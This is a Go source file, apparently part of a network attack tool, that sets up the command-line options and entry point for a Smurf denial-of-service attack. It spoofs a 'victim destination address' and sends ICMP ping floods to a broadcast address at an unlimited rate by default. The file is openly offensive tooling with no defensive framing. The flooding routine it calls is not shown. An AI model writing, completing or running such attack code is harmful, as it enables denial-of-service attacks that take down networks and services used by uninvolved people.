package module

import (
	"os"
	"log"
	_"time"

	_"cjr/protocol"
	flags "github.com/jessevdk/go-flags"
)

type SmurfOpt struct {
	BaseOption
	BroadcastFunc func(string) `short:"b" long:"broadcast" description:"broadcast address" value-name:"address"`
	Spoof string `short:"d" long:"destination" description:"victim destination address" value-name:"address"`
	CountFunc func(int) `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
	RateFunc func(string) `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
	TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
}

func (s *SmurfOpt) IsBroadcast() bool {
	return true
}

func smurfEntry(remainFlags []string) {
	var opts SmurfOpt

	opts.RateFunc = func(rate string) {
		commonRateFunc(&opts, rate)
	}
	opts.BroadcastFunc = func(dest string) {
		commonDestFunc(&opts, dest)
	}
	opts.CountFunc = func(count int) {
		commonCountFunc(&opts, count)
	}

	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		log.Fatal(err)
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return
		}
	}

	pingOpts := &PingFloodOpt {
		BaseOption: opts.BaseOption,
		Spoof: opts.Spoof,
	}
	pingFloodStart(pingOpts)
}
